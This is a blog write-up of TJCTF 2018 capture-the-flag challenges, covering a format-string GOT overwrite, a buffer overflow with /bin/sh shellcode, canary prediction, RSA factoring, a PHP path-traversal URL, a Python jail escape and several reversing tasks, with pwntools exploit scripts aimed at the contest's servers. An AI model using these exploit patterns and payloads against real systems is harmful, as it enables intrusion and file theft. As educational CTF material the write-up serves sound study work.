---
title: "TJCTF 2018 Writeup"
date: 2018-08-11T11:52:46+08:00
draft: false
tags: [
  "ctf",
  "cyber-security",
  "write-up"
]
description: solves for TJCTF 2018 challenges
---

# Secure Secrets - Binary Exploitation

## Problem

Written by evanyeyeye

I am responsible for architecting the most recent paradigm in our modern technological revolution: Secure Secrets. Why don't you [try](/blog/tjctf-2018-writeup/Secure%20Secrets/secure) it out?

## Solution

By playing around with the binary, we soon discover a [format string vulnerability](https://www.youtube.com/watch?v=0WvrSfcdq1I):

```text
Introducing Secure Secrets TM -- a revolutionary service for storing your most sensitive messages.
NEW FEATURE COMING SOON: Safely store your darkest secrets as well!

How does this work?
First, choose a strong password to protect your message:
> 123
Good choice! Now, simply leave your message below:
> %x %x %x
All done!
You can rest easy knowing that we are 100% unhackable.

For proof of concept, try accessing your message below.
You must input the correct password:
> 123

ffe2c22c f7f515c0 fbad2887

Tada! Hope you liked our service!
```

Furthermore, there is a function called `sym.get_secret` in the binary that basically prints out the flag:

```
vagrant@ubuntu-bionic:/ctf/tjctf/Secure Secrets$ r2 ./secure
 -- This computer has gone to sleep.
[0x080485e0]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[ ] Constructing a function name for fcn.* and sym.func.* functions (aan[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[x] Emulate code to find computed references (aae)
[x] Analyze consecutive function (aat)
[0x080485e0]> afl
0x080484c4    3 35           sym._init
0x08048500    1 6            sym.imp.setbuf
0x08048510    1 6            sym.imp.strcmp
0x08048520    1 6            sym.imp.printf
0x08048530    1 6            sym.imp.__isoc99_fscanf
0x08048540    1 6            sym.imp.fgets
0x08048550    1 6            sym.imp.__stack_chk_fail
0x08048560    1 6            sym.imp.getegid
0x08048570    1 6            sym.imp.puts
0x08048580    1 6            sym.imp.exit
0x08048590    1 6            sym.imp.__libc_start_main
0x080485a0    1 6            sym.imp.fopen
0x080485b0    1 6            sym.imp.memset
0x080485c0    1 6            sym.imp.setresgid
0x080485d0    1 6            sub.__gmon_start_5d0
0x080485e0    1 33           entry0
0x08048610    1 4            sym.__x86.get_pc_thunk.bx
0x08048620    4 43           sym.deregister_tm_clones
0x08048650    4 53           sym.register_tm_clones
0x08048690    3 30           sym.__do_global_dtors_aux
0x080486b0    4 43   -> 40   entry1.init
0x080486db    1 56           sym.lets_be_friends
0x08048713    6 128          sym.get_secret
0x08048793    4 196          sym.set_message
0x08048857    6 210          sym.get_message
0x08048929    1 121          sym.main
0x080489b0    4 93           sym.__libc_csu_init
0x08048a10    1 2            sym.__libc_csu_fini
0x08048a14    1 20           sym._fini
[0x080485e0]> pdf @ sym.get_secret
/ (fcn) sym.get_secret 128
|   sym.get_secret ();
|           ; var file*stream @ ebp-0x50
|           ; var char *local_4ch @ ebp-0x4c
|           ; var int local_ch @ ebp-0xc
|           0x08048713      55             push ebp
|           0x08048714      89e5           mov ebp, esp
|           0x08048716      83ec58         sub esp, 0x58               ; 'X'
|           0x08048719      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=-1 ; 20
|           0x0804871f      8945f4         mov dword [local_ch], eax
|           0x08048722      31c0           xor eax, eax
|           0x08048724      83ec08         sub esp, 8
|           0x08048727      68308a0408     push 0x8048a30              ; "r" ; const char *mode
|           0x0804872c      68328a0408     push str.flag.txt           ; 0x8048a32 ; "flag.txt" ; const char *filename
|           0x08048731      e86afeffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
|           0x08048736      83c410         add esp, 0x10
|           0x08048739      8945b0         mov dword [stream], eax
|           0x0804873c      837db000       cmp dword [stream], 0
|       ,=< 0x08048740      7512           jne 0x8048754
|       |   0x08048742      83ec0c         sub esp, 0xc
|       |   0x08048745      683b8a0408     push str.Secret_could_not_be_accessed. ; 0x8048a3b ; "Secret could not be accessed." ; const char *s
|       |   0x0804874a      e821feffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x0804874f      83c410         add esp, 0x10
|      ,==< 0x08048752      eb2b           jmp 0x804877f
|      ||   ; CODE XREF from sym.get_secret (0x8048740)
|      |`-> 0x08048754      83ec04         sub esp, 4
|      |    0x08048757      8d45b4         lea eax, [local_4ch]
|      |    0x0804875a      50             push eax                    ;  ...
|      |    0x0804875b      68598a0408     push 0x8048a59              ; "%s" ; const char *format
|      |    0x08048760      ff75b0         push dword [stream]         ; FILE *stream
|      |    0x08048763      e8c8fdffff     call sym.imp.__isoc99_fscanf ; int fscanf(FILE *stream, const char *format, ...)
|      |    0x08048768      83c410         add esp, 0x10
|      |    0x0804876b      83ec08         sub esp, 8
|      |    0x0804876e      8d45b4         lea eax, [local_4ch]
|      |    0x08048771      50             push eax
|      |    0x08048772      685c8a0408     push str.Here_is_your_secret:__s ; 0x8048a5c ; "Here is your secret: %s\n" ; const char *format
|      |    0x08048777      e8a4fdffff     call sym.imp.printf         ; int printf(const char *format)
|      |    0x0804877c      83c410         add esp, 0x10
|      |    ; CODE XREF from sym.get_secret (0x8048752)
|      `--> 0x0804877f      90             nop
|           0x08048780      8b45f4         mov eax, dword [local_ch]
|           0x08048783      653305140000.  xor eax, dword gs:[0x14]
|       ,=< 0x0804878a      7405           je 0x8048791
|       |   0x0804878c      e8bffdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       |   ; CODE XREF from sym.get_secret (0x804878a)
|       `-> 0x08048791      c9             leave
\           0x08048792      c3             ret
[0x080485e0]>
```

Utilizing these two pieces of information, we can try to override a libc function in the [GOT](https://www.youtube.com/watch?v=kUk5pw4w0h4) (`puts` in this case) with the `get_secret` function using two short writes similar to [this](https://www.youtube.com/watch?v=t1LH9D5cuK4).

Code:

```python
from pwn import *

# context.log_level = 'debug'
context.binary = './secure'

# sh = process('./secure')
sh = remote('problem1.tjctf.org', 8008)

secret_addr = 0x08048713
puts_got = 0x0804a028

payload = p32(puts_got)
payload += p32(puts_got+2)
payload += '%35$34571x'
payload += '%35$n'
payload += '%36$33009x'
payload += '%36$n'
payload += '\n'

sh.sendafter('> ', '12345\n')
sh.sendafter('> ', payload)
sh.sendafter('> ', '12345\n')
sh.interactive()
```

Flag: `tjctf{n1c3_j0b_y0u_r34lly_GOT_m3_600d}`

# Online Banking - Binary Exploitation

## Problem

Written by nthistle

Try out our new online banking service!

[binary](/blog/tjctf-2018-writeup/Online%20Banking/problem) [source](/blog/tjctf-2018-writeup/Online%20Banking/problem.c)

## Solution

Reading the C source code, we quickly notice that the `verify_pin` function is vulnerable to a buffer overflow attack where it tries to read `NAME_SIZE+1` bytes into a `PIN_SIZE+1` bytes array:

```c
int verify_pin(char* pin) {
    char pin_check[PIN_SIZE+1];
    printf("Please verify your PIN first:\nPIN: ");
    fgets(pin_check, NAME_SIZE+1, stdin);
    for(int i = 0; i < 4; i ++) {
        if(pin[i] != pin_check[i])
            return 0;
    }
    return 1;
}
```

This allows us to control the instruction pointer of the program. The next step would be to figure out a way of reading the flag.

Conveniently, we are given the ability to write up to 33 bytes into the program memory using the Name input and the program is not [NX](https://en.wikipedia.org/wiki/NX_bit) protected:

```
vagrant@ubuntu-bionic:/ctf/tjctf/Online Banking$ r2 ./problem
 -- I nodejs so hard my exams. What a nodejs!
[0x00400680]> i~nx
nx       false
```

This gives us a perfect condition to use a shellcode.

Code:

```python
from pwn import *

# context.log_level = 'debug'
context.binary = './problem'

# sh = process('./problem')
sh = remote('problem1.tjctf.org', 8005)

name_addr = 0x006010a0

PIN = '1234'

# from https://www.exploit-db.com/exploits/36858/
shellcode = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'

payload = 'a'*(5+4) + 'b'*8 + p64(name_addr)

sh.sendlineafter('Name: ', shellcode)
sh.sendlineafter('PIN: ', PIN)

sh.sendlineafter('q - quit\n', 'd')
sh.sendlineafter('PIN: ', payload)

sh.interactive()
```

Flag: `tjctf{d4n6_17_y0u_r0pp3d_m3_:(}`

# Validator - Reverse Engineering

## Problem

Written by evanyeyeye

I found a flag validation [program](/blog/tjctf-2018-writeup/Validator/flagcheck). Do what you want with it.

## Solution

The program first loads a partial flag in to memory and then patches the flag before the comparison:

```
vagrant@ubuntu-bionic:/ctf/tjctf/Validator$ r2 ./flagcheck
 -- Use /m to carve for known magic headers. speedup with search.
[0x08048400]> aaaa
...
[0x08048400]> pdf @ main
/ (fcn) main 310
|   main (int arg_4h);
...
|           0x08048520      c745c8746a63.  mov dword [s1], 0x74636a74  ; 'tjct'
|           0x08048527      c745cc667b6a.  mov dword [local_34h], 0x756a7b66 ; 'f{ju'
|           0x0804852e      c745d035375f.  mov dword [local_30h], 0x635f3735 ; '57_c'
|           0x08048535      c745d4346c6c.  mov dword [local_2ch], 0x5f6c6c34 ; '4ll_'
|           0x0804853c      c745d86d335f.  mov dword [local_28h], 0x725f336d ; 'm3_r'
|           0x08048543      c745dc337633.  mov dword [local_24h], 0x72337633 ; '3v3r'
|           0x0804854a      c745e035335f.  mov dword [local_20h], 0x365f3335 ; '53_6'
|           0x08048551      c745e430645f.  mov dword [local_1ch], 0x665f6430 ; '0d_f'
|           0x08048558      c745e872306d.  mov dword [local_18h], 0x5f6d3072 ; 'r0m_'
|           0x0804855f      c745ec6e3077.  mov dword [local_14h], 0x5f77306e ; 'n0w_'
|           0x08048566      c745f0306e7d.  mov dword [local_10h], 0x7d6e30 ; '0n}'
|           0x0804856d      833802         cmp dword [eax], 2          ; [0x2:4]=-1 ; 2
...
|      ||   0x0804858f      c645db33       mov byte [local_25h], 0x33  ; '3' ; 51
|      ||   0x08048593      c645de33       mov byte [local_22h], 0x33  ; '3' ; 51
|      ||   0x08048597      c645e033       mov byte [local_20h], 0x33  ; '3' ; 51
|      ||   0x0804859b      c645dc35       mov byte [local_24h], 0x35  ; section_end..comment
|      ||   0x0804859f      c645dd72       mov byte [local_23h], 0x72  ; 'r' ; 114
|      ||   0x080485a3      c645e172       mov byte [local_1fh], 0x72  ; 'r' ; 114
|      ||   0x080485a7      c645df76       mov byte [local_21h], 0x76  ; 'v' ; 118
|      ||   0x080485ab      8b45c4         mov eax, dword [s2]
...
```

To solve the problem, we can set a breakpoint after the flag is patched and extract it from memory:

```
vagrant@ubuntu-bionic:/ctf/tjctf/Validator$ r2 ./flagcheck
[0x08048400]> ood aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
...
[0xf7fc4c70]> aaaa
...
[0xf7fc4c70]> pdf @ main
...
|      ||   0x0804858f      c645db33       mov byte [local_25h], 0x33  ; '3' ; 51
|      ||   0x08048593      c645de33       mov byte [local_22h], 0x33  ; '3' ; 51
|      ||   0x08048597      c645e033       mov byte [local_20h], 0x33  ; '3' ; 51
|      ||   0x0804859b      c645dc35       mov byte [local_24h], 0x35  ; section_end..comment
|      ||   0x0804859f      c645dd72       mov byte [local_23h], 0x72  ; 'r' ; 114
|      ||   0x080485a3      c645e172       mov byte [local_1fh], 0x72  ; 'r' ; 114
|      ||   0x080485a7      c645df76       mov byte [local_21h], 0x76  ; 'v' ; 118
|      ||   0x080485ab      8b45c4         mov eax, dword [local_3ch]
...
[0xf7fc4c70]> db 0x080485ab
[0xf7fc4c70]> dc
hit breakpoint at: 80485ab
[0x080485ab]> ps 100 @ ebp-0x50
\x00\x00\x00\x00\x00n\x08\xc8\x09\x00\x00\x008\x84\x9d\xff\xa9D\xe0\xf7\x04l\x9d\xfftjctf{ju57_c4ll_m3_35r3v3r_60d_fr0m_n0w_0n}\x00\x00n\x08\xc8\xb09\xfd\xf7pk\x9d\xff\x00\x00\x00\x00\x81\xce\xde\xf7\x00\xc0\xfa\xf7\x00\xc0\xfa\xf7\x00\x00\x00\x00
```

Flag: `tjctf{ju57_c4ll_m3_35r3v3r_60d_fr0m_n0w_0n}`

# Future Canary Lab - Binary Exploitation

## Problem

Written by evanyeyeye

The world renowned Future Canary Lab is looking for a new lab member. Good luck with your [interview](/blog/tjctf-2018-writeup/Future Canary Lab/interview) ([source](/blog/tjctf-2018-writeup/Future Canary Lab/interview.c))!

## Solution

Looking at the source code, our goal would be to override `i`, `j`, and `secret`, but the only way to do so is via the `gets` call that first overrides the canary, a buffer of ten random integers that we cannot change.

```c
#include <stdio.h>
#include <stdlib.h>

#define FLAG "-----REDACTED-----"

void interview(int secret) {

    int i, j;
    int canary[10];
    char name[64];
    int check[10];

    for (i = 0; i < 10; ++i) {
        canary[i] = check[i] = rand();
    }

    printf("Welcome to the Future Canary Lab!\n");
    printf("What is your name?\n");
    gets(name);

    for (j = 0; j < 10; ++j) {
        if (canary[j] != check[j]) {
            printf("Alas, it would appear you lack the time travel powers we desire.\n");
            exit(0);
        }
    }

    if (secret - i + j == 0xdeadbeef) {
        printf("You are the one. This must be the choice of Stacks Gate!\n");
        printf("Here is your flag: %s\n", FLAG);
    } else {
        printf("Begone, FBI Spy!\n");
    }

    exit(0);
}

int main() {

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    setbuf(stdout, NULL);

    srand(time(NULL));

    interview(0);

    return 0;
}
```

As it turns out the solution would be to predict the future :). Because the `random` function is seeded with the current time, we have a chance of reproducing the same sequence given the time:

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char * argv []) {

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    setbuf(stdout, NULL);

    srand(time(NULL)+atoi(argv[1]));

    for (int i = 0; i < 10; ++i) {
        printf("%d ", rand());
    }
    printf("\n");

    return 0;
}
```

This is a program that spits out ten random integers that will be generated x seconds in the future. Combining this with the python script below, we are able to safely override our variables without changing the canary:

```python
from pwn import *
import subprocess

context.log_level = 'debug'
context.binary = './interview'

# sh = process('./interview')
sh = remote('problem1.tjctf.org', 8000)

r = list(map(lambda x: p32(int(x)), subprocess.check_output(["./exploit", '0']).strip().split(' ')))

payload = 'a'*64 # pad
payload += ''.join(r) # canary
payload += p32(0x01010101) # j
payload += p32(0x01010101) # i
for i in range(20):
  payload += p32(3752771558)

sh.sendlineafter('?\n', payload)
sh.interactive()
```

Flag: `tjctf{3l_p5y_k0n6r00_0ur_n3w357_l4b_m3mb3r!}`

# Classic - Cryptography

## Problem

Written by etherlyt

My primes might be close in size but they're big enough that it shouldn't matter right? [rsa.txt](/blog/tjctf-2018-writeup/Classic/rsa.txt)

## Solution

Just factor n. In this case, I used [this tool](https://www.alpertron.com.ar/ECM.HTM) to do the job.

Code:

```python
# https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e
e = 65537
n = 128299637852747781491257187842028484364103855748297296704808405762229741626342194440837748106022068295635777844830831811978557490708404900063082674039252789841829590381008343327258960595508204744589399243877556198799438322881052857422197506822302290812621883700357890208069551876513290323124813780520689585503
c = 43160414063424128744492209010823042660025171642991046645158489731385945722740307002278661617111192557638773493117905684302084789590107080892369738949935010170735247383608959796206619491522997896941432858113478736544386518678449541064813172833593755715667806740002726487780692635238838746604939551393627585159
p = 11326943005628119672694629821649856331564947811949928186125208046290130000912120768861173564277210907403841603312764378561200102283658817695884193223692869
q = 11326943005628119672694629821649856331564947811949928186125208046290130000912216246378177299696220728414241927034282796937320547048361486068608744598351187

def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

# Compute phi(n)
phi = (p - 1) * (q - 1)

# Compute modular inverse of e
gcd, a, b = egcd(e, phi)
d = a

# Decrypt ciphertext
pt = pow(c, d, n)
print( "pt: " + hex(pt) )
```

Flag: `tjctf{1_l1ke_squares}`

# Programmable Hyperlinked Pasta - Web

## Problem

Written by nthistle

Check out my new site! PHP is so cool!

## Solution

The website also have a Spanish version via this url:

> https://programmable_hyperlinked_pasta.tjctf.org/?lang=es.php

`es.php` is definitely a file, so I tried:

> https://programmable_hyperlinked_pasta.tjctf.org/?lang=flag.txt

This didn't work, so I attempted:

> https://programmable_hyperlinked_pasta.tjctf.org/?lang=../../../../../../../../../proc/self/cwd/flag.txt

Problem solved!

Notes:

* doing `../../../../../../../../../` will bring you to `/` eventually
* `/proc/self` always refer to the current program
* `/proc/self/cwd` is a symbolic link to the current working directory of the program

Flag: `tjctf{l0c4l_f1l3_wh4t?}`

# Bricked Binary - Reverse Engineering

## Problem

Written by evanyeyeye

Earlier, I input my flag to this [image](/blog/tjctf-2018-writeup/Bricked Binary/hashgen) and received 22c15d5f23238a8fff8d299f8e5a1c62 as the output. Unfortunately, later on I broke the program and also managed to lose my flag. Can you find it for me?

The flag is not in standard flag format.

## Solution

Because the binary is bricked, tools like angr would not work in this case; therefore, I went straight to reversing the algorithm by hand using ida.

Here is the equivalent algorithm rewritten in python:

```python
u = [
  0x04, 0x07, 0x05, 0x08, 0x0C, 0x0A, 0x06, 0x02, 0x0D, 0x01, 0x00, 0x0E, 0x09, 0x0B, 0x03, 0x0F,
  0xCA, 0xDE, 0x14, 0x94, 0x29, 0xE9, 0x44, 0x4B, 0x84, 0xE4, 0xD7, 0x3A, 0x62, 0x3F, 0xEF, 0xB7,
  0x7A, 0x9F, 0xF7, 0xFD, 0x56, 0x52, 0xB9, 0xC7, 0x3E, 0x5C, 0xC4, 0xD5, 0xE1, 0xC9, 0x93, 0x76,
  0x48, 0x88, 0xBF, 0x67, 0xA4, 0xEA, 0xD0, 0x17, 0xCE, 0x98, 0xBB, 0xAC, 0x1C, 0xAB, 0xC1, 0x26,
  0xA6, 0x83, 0xDD, 0x10, 0x96, 0x9D, 0x80, 0x19, 0x9C, 0xAF, 0x91, 0xD8, 0xAD, 0xA5, 0xB4, 0x71,
  0xDA, 0xF9, 0x8C, 0x77, 0xA8, 0x75, 0xA7, 0x55, 0x3B, 0xFE, 0xE8, 0xED, 0x61, 0x24, 0x95, 0x54,
  0x63, 0xAE, 0x4A, 0xDF, 0x31, 0x36, 0xF3, 0x8D, 0x1D, 0x59, 0x47, 0x5D, 0x74, 0xC0, 0x6C, 0x22,
  0x69, 0xBE, 0xEE, 0x8A, 0x34, 0xD3, 0x15, 0x70, 0xBC, 0xF0, 0x97, 0xF4, 0xE6, 0xD4, 0x4C, 0xF1,
  0x79, 0xB8, 0x73, 0xDC, 0x35, 0xD2, 0xCB, 0x5F, 0x8E, 0xC8, 0x38, 0x32, 0xFB, 0xFA, 0x7B, 0xCD,
  0x5A, 0x90, 0xA1, 0xA3, 0x58, 0x8B, 0xB0, 0xD9, 0xB3, 0x7D, 0xEB, 0xD1, 0x78, 0xFC, 0x86, 0x50,
  0xBD, 0x39, 0xC2, 0x5E, 0xBA, 0x30, 0x23, 0x43, 0x28, 0xCF, 0x6E, 0xE5, 0x51, 0xDB, 0xB5, 0xA9,
  0xE7, 0x20, 0x21, 0x6A, 0xB2, 0xF6, 0x42, 0xE3, 0xE0, 0x4F, 0x27, 0x81, 0x2B, 0x7E, 0xA2, 0xF5,
  0x89, 0xD6, 0xFF, 0x12, 0x46, 0x40, 0x9A, 0x60, 0x7F, 0x2D, 0x13, 0x1F, 0x87, 0xCC, 0x1A, 0x92,
  0x11, 0x2C, 0xB1, 0x57, 0x85, 0xC6, 0xB6, 0x66, 0x82, 0x6B, 0xC3, 0x1B, 0x16, 0x6F, 0x37, 0xE2,
  0x53, 0x1E, 0x6D, 0x4E, 0x45, 0x64, 0x2F, 0x72, 0xC5, 0x65, 0x7C, 0x25, 0x41, 0x49, 0xF8, 0x3C,
  0x2E, 0xAA, 0x33, 0x8F, 0x4D, 0x68, 0x9E, 0x5B, 0x3D, 0xEC, 0x99, 0xA0, 0x9B, 0x18, 0xF2, 0x2A
]

v = [
  0x81, 0xCD, 0x0A, 0x73, 0xB3, 0x3B, 0x32, 0xB6, 0x6E, 0x7C, 0x31, 0x57, 0xD1, 0xC5, 0x15, 0x3A,
  0x92, 0xB4, 0xE2, 0x51, 0xAE, 0x42, 0x55, 0x41, 0xE1, 0x70, 0x30, 0x1A, 0x02, 0x84, 0xA2, 0xE7,
  0xB9, 0x4D, 0x3C, 0xA3, 0x0B, 0xB2, 0x2B, 0xAB, 0x46, 0x7E, 0x24, 0x9C, 0x85, 0x6F, 0xE4, 0xC4,
  0x5F, 0xCE, 0x4F, 0x01, 0x82, 0xFD, 0x6C, 0xAC, 0xDF, 0x64, 0x0C, 0xA1, 0xE3, 0x9E, 0x5D, 0xBB,
  0xFE, 0xD3, 0x29, 0x96, 0xC7, 0xF3, 0xFC, 0x65, 0xAA, 0x8A, 0x5A, 0xF5, 0xB7, 0x38, 0xA5, 0x8D,
  0xD8, 0x8E, 0x39, 0x07, 0xDE, 0xD5, 0x11, 0x80, 0xE5, 0x89, 0x35, 0xFF, 0xDD, 0xA6, 0x1F, 0x23,
  0x0D, 0xC0, 0x93, 0xC8, 0x67, 0x17, 0x68, 0x18, 0x8B, 0x62, 0xCC, 0x9D, 0xDA, 0x56, 0x66, 0xC6,
  0x7F, 0xE6, 0x86, 0xE0, 0x22, 0xC2, 0x0F, 0x1B, 0xF6, 0x2D, 0x63, 0x33, 0x91, 0x71, 0x59, 0xEB,
  0xA9, 0xD2, 0x83, 0xBF, 0x3D, 0x6A, 0x08, 0xF9, 0xA7, 0x40, 0x00, 0xE8, 0x52, 0xBE, 0xFA, 0x4E,
  0x26, 0x76, 0xCF, 0x54, 0x7D, 0x19, 0x06, 0xF8, 0xD0, 0x74, 0x28, 0x05, 0x3F, 0xA0, 0x1E, 0xC1,
  0x45, 0x49, 0xD4, 0xAF, 0x03, 0x9B, 0x2F, 0xEE, 0x27, 0x9A, 0xA4, 0x97, 0x48, 0x4A, 0xD9, 0x37,
  0x47, 0xAD, 0x44, 0xCA, 0xEF, 0xD7, 0xB8, 0xDB, 0xF0, 0x9F, 0x58, 0x53, 0xEA, 0x2A, 0x7A, 0x36,
  0x87, 0x8C, 0xB5, 0x72, 0x88, 0xB1, 0x09, 0xF1, 0x16, 0x3E, 0x69, 0x14, 0xEC, 0x25, 0xBC, 0xED,
  0xBA, 0xBD, 0x2C, 0xC9, 0xDC, 0x13, 0xF4, 0x75, 0x1D, 0x4B, 0xC3, 0x34, 0x10, 0x6B, 0x77, 0x98,
  0x5E, 0x5C, 0x99, 0x8F, 0x12, 0x94, 0xCB, 0x2E, 0x4C, 0xE9, 0x20, 0xF7, 0x43, 0x60, 0xFB, 0x6D,
  0x1C, 0x78, 0x0E, 0xB0, 0xD6, 0x50, 0x79, 0x7B, 0x61, 0x95, 0xA8, 0x04, 0x5B, 0xF2, 0x90, 0x21
]

message = ''

input_size = len(message)
counter = 0

while counter < input_size:
    input_size_1_counter = input_size - 1 - counter # index ref

    ebx = u[counter]
    eax = v[message[input_size_1_counter]]

    message[input_size_1_counter] = xor(eax, ebx)

    counter += 1

print message
```

As you can see, it is a xor encryption with two byte matrixes:

1. v matrix transform
2. xor with the u matrix

The code below reverses the process:

```python
u = [
  ...
]

v = [
  ...
]

message = [0x22, 0xc1, 0x5d, 0x5f, 0x23, 0x23, 0x8a, 0x8f, 0xff, 0x8d, 0x29, 0x9f, 0x8e, 0x5a, 0x1c, 0x62]
input_size = len(message)
for counter in range(input_size):
  input_size_1_counter = input_size - 1 - counter

  message[input_size_1_counter] = message[input_size_1_counter] ^ u[counter]
  message[input_size_1_counter] = v.index(message[input_size_1_counter])


print(message)
print(''.join([ hex(x)[2:] for x in message ]))
```

Flag: `yummy_h45h_br0wn`

# Interference - Miscellaneous

## Problem

Written by jfrucht25

I was looking at some images but I couldn't see them clearly. I think there's some [interference](/blog/tjctf-2018-writeup/Interference/interference.zip).

## Solution

The zip file contains two png images with the same dimension.


{{< figure src="/blog/tjctf-2018-writeup/Interference/v1.png" caption="v1.png">}}

{{< figure src="/blog/tjctf-2018-writeup/Interference/v2.png" caption="v2.png">}}

By comparing each pixel using imagemagick, we get a new image which is a QR code:

```
> compare v1.png v2.png diff.png
```

{{< figure src="/blog/tjctf-2018-writeup/Interference/diff.png" caption="diff.png">}}

After decoding the QR code, you get the flag.

Flag: `tjctf{m1x1ing_and_m4tchIng_1m4g3s_15_fun}`

# Mirror Mirror - Miscellaneous

## Problem

Written by Alaska47

If you look closely, you can see a reflection.

`nc problem1.tjctf.org 8004`

## Solution

This is a python jail escape problem similar to [this](https://lbarman.ch/blog/pyjail/).

By overriding `bad` and `banned` in the `get_flag` function, we can print out the source code of the challenge:

```python
>>> dir(get_flag)
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
>>> get_flag.func_globals
{'PseudoFile': <class '__main__.PseudoFile'>, 'code': <module 'code' from '/usr/lib/python2.7/code.pyc'>, 'bad': ['__class__', '__base__', '__subclasses__', '_module', 'open', 'eval', 'execfile', 'exec', 'type', 'lambda', 'getattr', 'setattr', '__', 'file', 'reload', 'compile', 'builtins', 'os', 'sys', 'system', 'vars', 'getattr', 'setattr', 'delattr', 'input', 'raw_input', 'help', 'open', 'memoryview', 'eval', 'exec', 'execfile', 'super', 'file', 'reload', 'repr', 'staticmethod', 'property', 'intern', 'coerce', 'buffer', 'apply'], '__builtins__': <module '?' (built-in)>, '__file__': '/home/app/problem.py', 'execfile': <built-in function execfile>, '__package__': None, 'sys': <module 'sys' (built-in)>, 'getattr': <built-in function getattr>, 'Shell': <class __main__.Shell at 0x7f0b20f79c80>, 'banned': ['vars', 'getattr', 'setattr', 'delattr', 'input', 'raw_input', 'help', 'open', 'memoryview', 'eval', 'exec', 'execfile', 'super', 'file', 'reload', 'repr', 'staticmethod', 'property', 'intern', 'coerce', 'buffer', 'apply'], 'InteractiveConsole': <class code.InteractiveConsole at 0x7f0b20f79c18>, 'eval': <built-in function eval>, 'get_flag': <function get_flag at 0x7f0b20f898c0>, '__name__': '__main__', 'main': <function main at 0x7f0b20f9c410>, '__doc__': None, 'print_function': _Feature((2, 6, 0, 'alpha', 2), (3, 0, 0, 'alpha', 0), 65536)}
>>> get_flag.func_globals['bad'] = []
>>> get_flag.func_globals['banned'] = []
>>> open('/home/app/problem.py').read()
...
```

[source code](/blog/tjctf-2018-writeup/Mirror Mirror/source.py)

By running the line that generates the flag locally, we can print out the flag.

Flag: `tjctf{wh0_kn3w_pyth0n_w4s_s0_sl1pp3ry}`

# Ssleepy - forensics

## Problem

Written by Alaska47

I found this super suspicious [transmission](/blog/tjctf-2018-writeup/Ssleepy/ssleepy.pcapng) lying around on the floor. What could be in it?

## Solution

By inspecting the traffic dump using wireshark, we can see that there are two types of protocals: `ftp` and `https`. Because `https` is encrypted, we start by looking at the `ftp` traffics:

{{< figure src="/blog/tjctf-2018-writeup/Ssleepy/screen.png" caption="A zip file was transfered">}}

After extracting the zip file, we obtain a [key file](/blog/tjctf-2018-writeup/Ssleepy/server_key.pem).

Using this key, we can then decrypt the https traffic:

{{< figure src="/blog/tjctf-2018-writeup/Ssleepy/screen2.png">}}

Extracing an image from the traffic, we are able to get the flag:

{{< figure src="/blog/tjctf-2018-writeup/Ssleepy/flag.jpg">}}

# Bad Cipher - Reverse Engineering

## Problem

Written by nthistle

My friend insisted on using his own cipher program to encrypt this flag, but I don't think it's very secure. Unfortunately, he is quite good at Code Golf, and it seems like he tried to make the program as short (and confusing!) as possible before he sent it.

I don't know the key length, but I do know that the only thing in the plaintext is a flag. Can you break his cipher for me?

[Encryption Program](/blog/tjctf-2018-writeup/Bad Cipher/bad_cipher.py)

[Encrypted Flag](/blog/tjctf-2018-writeup/Bad Cipher/flag.enc)

## Solution

I started out by constructing a decryption method. Then I find the key length based on the algorithm (8 bytes in this case). Because the message is the flag, the first six characters must be `tjctf{` which gives us the first six bytes of the key. With only 2 bytes unknown, we can just brute force the flag:

```python
import string

message = "[REDACTED][REDACTED][REDACTED]abcdefg"
key = "abcde"


def e(message, key):
  l = len(key)
  s = [message[i::l] for i in range(l)]
  print s
  for i in range(l):
    a = 0
    e = ''
    for c in s[i]:
      a = ord(c) ^ ord(key[i]) ^ (a >> 2)
      e += chr(a)
    s[i] = e

  # print s
  # print(zip(*s))
  # print "".join("".join(y) for y in zip(*s))
  return "".join(hex((1 << 8)+ord(f))[3:] for f in "".join("".join(y) for y in zip(*s)))

def crack(message):
  startText = 'tjctf{'
  possibleKeyLength = [1, 2, 4, 7, 8, 14, 28, 56]

  for l in possibleKeyLength:
    key = ''
    chars = [ chr(int(message[x:x+2], 16)) for x in range(0, len(message), 2) ]
    splitCipher = lambda A, n: [tuple(A[i:i+n]) for i in range(0, len(A), n)]
    chars = splitCipher(chars, l)
    chars = zip(*chars)
    for i in range(min(len(startText), len(chars))):
      key += chr(ord(chars[i][0]) ^ ord(startText[i]))
    print key
    
def d(message, key):
  l = len(key)
  chars = [ chr(int(message[x:x+2], 16)) for x in range(0, len(message), 2) ]
  splitCipher = lambda A, n: [tuple(A[i:i+n]) for i in range(0, len(A), n)]
  chars = splitCipher(chars, l)
  chars = zip(*chars)
  # print chars
  for i in range(l):
    a = 0
    e = ''
    for charI in range(len(chars[i])):
      if a == 0:
        a = ord(chars[i][charI]) ^ ord(key[i]) ^ (a >> 2)
      else:
        a = ord(chars[i][charI]) ^ ord(key[i]) ^ (ord(chars[i][charI-1]) >> 2)
      e += chr(a)
    chars[i] = e

  final = ''
  for a in range(len(chars[0])):
    for b in range(len(chars)):
      final += chars[b][a]
  return final

c = e(message, key)
print c
print d(c, key)
